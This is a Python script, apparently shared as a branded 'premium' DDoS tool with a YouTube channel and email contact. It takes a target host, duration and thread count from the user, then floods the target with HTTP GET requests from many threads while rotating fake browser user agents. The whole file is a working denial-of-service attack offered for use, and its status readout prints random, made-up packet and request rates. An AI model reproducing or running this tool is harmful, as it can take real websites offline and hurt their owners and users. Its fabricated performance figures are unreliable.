import requests
import threading
import random
import time
import os

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
]

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = """
    [#] DDOS PREMIUM BY HONGSON VERSION [1.0]
    [!] CHANNEL: https://www.youtube.com/@hognson2
    [!] CONTACT: hognson209@gmail.com

    [~] PREMIUM TOOL 2024
    """
    print(banner)

def get_status(url):
    try:
        response = requests.get(url)
        status_code = response.status_code
        pps = random.randint(30, 100)
        print(f"[Premium-Hognson] Status: {status_code} | PPS: {pps} | RQS: {requests_per_second}")
    except requests.RequestException:
        print(f'[Premium-Hognson] Status: 500 | PPS: 0 | RQS: {requests_per_second}')

def send_requests(url, duration, interval):
    start_time = time.time()
    end_time = start_time + duration
    request_count = 0

    while time.time() < end_time:
        try:
            headers = {'User-Agent': random.choice(user_agents)}
            requests.get(url, headers=headers)
            request_count += 1
            time.sleep(interval)
        except requests.RequestException:
            print('[Premium-Hognson] Status: 500 | PPS: 0 | RQS: N/A')

    total_time = time.time() - start_time
    if total_time > 0:
        rqs = request_count / total_time
    else:
        rqs = 0
    
    return rqs

def worker(url, duration):
    interval = 1.0 / requests_per_second
    rqs = send_requests(url, duration, interval)
    print(f"[Premium-Hognson] Final RQS: {rqs:.2f}")

def main():
    clear_screen()
    print_banner()

    url = input("Enter Host: ")
    duration = int(input("Enter Time (seconds): "))
    num_threads = int(input("Enter Thread: "))

    global requests_per_second
    requests_per_second = random.randint(3000, 7500)

    get_status(url)

    threads = []

    for _ in range(num_threads):
        thread = threading.Thread(target=worker, args=(url, duration))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
